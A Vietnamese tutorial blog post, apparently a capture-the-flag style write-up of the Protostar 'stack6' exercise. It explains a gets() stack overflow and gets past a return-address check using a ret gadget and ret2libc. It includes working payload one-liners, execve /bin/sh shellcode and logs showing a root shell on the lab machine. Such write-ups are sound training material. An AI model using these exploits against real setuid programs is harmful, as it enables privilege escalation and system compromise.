---
layout: post
title: stack6
---
Trong bài trước, chúng ta đã học cách inject code và điều hướng chương trình để đoạn code này được thực thi.
Bài này sẽ nâng độ khó lên một chút bằng cách giới hạn giá trị `eip` của caller.
Hãy cùng xem source code và asm code của chương trình như sau:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```
```asm
0x08048484 <getpath+0>: push   ebp
0x08048485 <getpath+1>: mov    ebp,esp
0x08048487 <getpath+3>: sub    esp,0x68
0x0804848a <getpath+6>: mov    eax,0x80485d0
0x0804848f <getpath+11>:        mov    DWORD PTR [esp],eax
0x08048492 <getpath+14>:        call   0x80483c0 <printf@plt>
0x08048497 <getpath+19>:        mov    eax,ds:0x8049720
0x0804849c <getpath+24>:        mov    DWORD PTR [esp],eax
0x0804849f <getpath+27>:        call   0x80483b0 <fflush@plt>
0x080484a4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484a7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484b8 <getpath+52>:        and    eax,0xbf000000
0x080484bd <getpath+57>:        cmp    eax,0xbf000000
0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
0x080484c4 <getpath+64>:        mov    eax,0x80485e4
0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
0x080484e4 <getpath+96>:        mov    eax,0x80485f0
0x080484e9 <getpath+101>:       lea    edx,[ebp-0x4c]
0x080484ec <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x080484f0 <getpath+108>:       mov    DWORD PTR [esp],eax
0x080484f3 <getpath+111>:       call   0x80483c0 <printf@plt>
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
0x080484fa <main+0>:    push   ebp
0x080484fb <main+1>:    mov    ebp,esp
0x080484fd <main+3>:    and    esp,0xfffffff0
0x08048500 <main+6>:    call   0x8048484 <getpath>
0x08048505 <main+11>:   mov    esp,ebp
0x08048507 <main+13>:   pop    ebp
0x08048508 <main+14>:   ret

```
Hàm `getpath` không cho phép `eip` của caller có dạng `0xbf??????`, tương đương với địa chỉ của bộ nhớ stack.
Do vậy, kỹ thuật của bài trước sẽ cần phải thay đổi.

Về cơ bản, đoạn code inject vào chương trình được lưu trong stack.
Do vậy, chúng ta vẫn sẽ cần điều hướng chương trình đến bộ nhớ này.
Để làm được điều này, ta sẽ dùng một kỹ thuật có tên "Return-Oriented Programming" (ROP).
Mục tiêu của kỹ thuật này là điều hướng chương trình đến nhưng đoạn code có sẵn nằm trong vùng cho phép thực thi (ví dụ trong vùng .text của asm, và không phải trên stack).
Việc điều hướng có thể được thực hiện nhiều lần có tính toán, khiến chương trình thực thi một chuỗi lệnh.

Sau đây là một ví dụ của ROP.
Chúng ta sẽ thực hiện overflow cho `buffer` như bài trước để inject code và ghi đè `eip` của caller.
Lần này chúng ta sẽ điều hướng `eip` đến một lệnh `ret` bất kỳ có sẵn trong chương trình chính.
Khi lệnh `ret` này được thực thi, giá trị tại `esp` sẽ được `pop` sang `eip`.
Dựa vào dự đoán này, ta sẽ ghi đè thêm 4 byte ngay sau `eip` mới.
4 byte này chính là địa chỉ của đoạn code đã được inject.
Nó có thể nằm trên stack.
```bash
python -c "print '\xcc' * 64 + '\xcc' * 4 + '\xcc' * 8 + '\xcc' * 4 + '\xf9\x84\x04\x08' + '\x6c\xf7\xff\xbf'" > input.txt
```
Đoạn script trên ghi đè lên 64 byte giá trị `buffer`, 4 byte giá trị biến `ret`, 8 byte padding, 4 byte `eip` mới của caller, và 4 byte địa chỉ injected code.
Sau đây là bộ nhớ trước và sau `gets`.
Phân biệt <span style="color:aqua">buffer</span>, <span style="color:orangered">eip mới của caller</span>, và <span style="color:springgreen">địa chỉ điều hướng về injected code</span>.
<pre class="memory">
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xb7f0186e</span>
0xbffff750:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0xb7ec6165</span>      <span style="color:aqua">0xbffff768</span>      <span style="color:aqua">0xb7eada75</span>
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080496ec</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x0804835c</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080496ec</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x08048539</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048520</span>      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0xbffff7a8      <span style="color:orangered">0x08048505</span>
0xbffff7a0:     0x08048520      0x00000000      0xbffff828      0xb7eadc76
</pre>
<pre class="memory">
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xcccccccc</span>
0xbffff750:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc
0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      <span style="color:orangered">0x080484f9</span>
0xbffff7a0:     <span style="color:springgreen">0xbffff76c</span>      0x00000000      0xbffff828      0xb7eadc76
</pre>
Chương trình sẽ chạy bình thường cho đến lệnh `ret` của hàm `getpath`.
Sau đó, chương trình sẽ được điều hướng đến lệnh `ret` của `getpath` một lần nữa.
Địa chỉ của đoạn injected code lúc này được `pop` vào `eip` và đoạn code này được thực thi.
Sau đây là chuỗi chương trình được ghép lại để bạn dễ hình dung.
<pre class="memory">
0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
...
0x080484f8 <getpath+116>:       leave
0x080484f9 <getpath+117>:       ret
<span style="color:orangered">0x080484f9 <getpath+117>:       ret</span>
<span style="color:springgreen">0xbffff76c:                     int3</span>
</pre>
Lưu ý, đoạn injected code trong ví dụ chỉ là trap breakpoint.
Chúng ta có thể sử dụng shellcode và NOP-sled như phần tham khảo cuối bài.

Ngoài ROP, chúng ta cũng có thể sử dụng 1 phương pháp khác có tên ret2libc.
Phương pháp này có thể dùng để chống lại các phương thức bảo mật cao hơn như cấm thực thi lệnh lưu ngoài vùng cho phép.
Sau đây là ví dụ sử dụng hàm `system` trong libc để chạy các chương trình khác.
Để tìm ra địa chỉ của `system`, ta có thể chạy lệnh print trong gdb:

```bash
(gdb) b main
(gdb) run < input.txt
(gdb) print system
```
Hàm `system` cần thêm tham số là pointer đến chuỗi ký tự lệnh.
Ví dụ, nếu muốn chạy "/bin/sh", ta cần cung cấp địa chỉ của chuỗi này cho hàm `system`.
Để tìm được địa chỉ chuỗi này, ta có thể dùng lệnh bash sau:
```bash
strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
```
Kết quả trả về sẽ bao gồm offset của chuỗi, `0x11f3bf`, so với địa chỉ của libc khi chương trình stack6 được chạy.
Muốn tìm địa chỉ của libc khi process đang chạy, hãy dùng lệnh sau trong gdb:
```bash
(gdb) info proc map
```
Ta nhận được địa chỉ của libc nằm tại `0xb7e97000`.
Kết hợp offset và địa chỉ, chuỗi "/bin/sh" có thể tìm thấy tại `0xb7fb63bf`.
Sau cùng, giá trị `buffer` để làm tràn và exploit chương trình sẽ như sau:
```bash
python -c "print '\xcc' * 80 + '\xb0\xff\xec\xb7' + 'AAAA' + '\xbf\x63\xfb\xb7'" > input.txt
```
Giá trị này bao gồm 80 byte chung cho `buffer`, biến `ret`, `padding`, và `ebp` của caller.
4 byte tiếp theo dành cho `eip` mới của caller, sẽ chỉ đến hàm `system`.
4 byte tiếp theo là `eip` của hàm gọi hàm `system`, cụ thể trong ví dụ này chính là hàm `getpath`.
Tuy nhiên, chúng ta cũng không cần quan tâm giá trị này vì mục đích chính là exploit chương trình.
4 byte cuối là tham số cho hàm `system` và chính là địa chỉ của chuỗi có sẵn "/bin/sh".
Bộ nhớ sau `gets` sẽ như sau.
Phân biệt <span style="color:aqua">buffer</span>, <span style="color:orangered">eip mới của caller (địa chỉ libc system)</span>, <span style="color:yellow">eip sau khi return từ system</span>, và <span style="color:springgreen">tham số của system (địa chỉ của "/bin/sh")</span>.
<pre class="memory">
0xbffff730:     0xbffff74c      0x00000000      0xb7fe1b28      0x00000001
0xbffff740:     0x00000000      0x00000001      0xb7fff8f8      <span style="color:aqua">0xcccccccc</span>
0xbffff750:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      0xcccccccc
0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      <span style="color:orangered">0xb7ecffb0</span>
0xbffff7a0:     <span style="color:yellow">0x41414141</span>      <span style="color:springgreen">0xb7fb63bf</span>      0xbffff800      0xb7eadc76
</pre>

## Ref
```bash
user@protostar:~$ python -c "print 'ABC\x00' + '\x90' * 32 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 16 + '\xf9\x84\x04\x08' + '\x70\xf7\xff\xbf'" > input.txt
user@protostar:~$ (cat input.txt; cat) | stack6
input path please: got path ABC
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

```
```bash
user@protostar:~$ python -c "print 'ABCD' + '\x00' * 76 + '\xb0\xff\xec\xb7' + 'AAAA' + '\xbf\x63\xfb\xb7'" > input.txt
user@protostar:~$ (cat input.txt; cat) | stack6
input path please: got path ABCD
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
exit

Segmentation fault
```
```bash
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run < input.txt
Starting program: /opt/protostar/bin/stack6 < input.txt

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
```
```bash
(gdb) info proc map
process 11046
cmdline = '/opt/protostar/bin/stack6'
cwd = '/home/user'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```
```bash
user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
 11f3bf /bin/sh
```
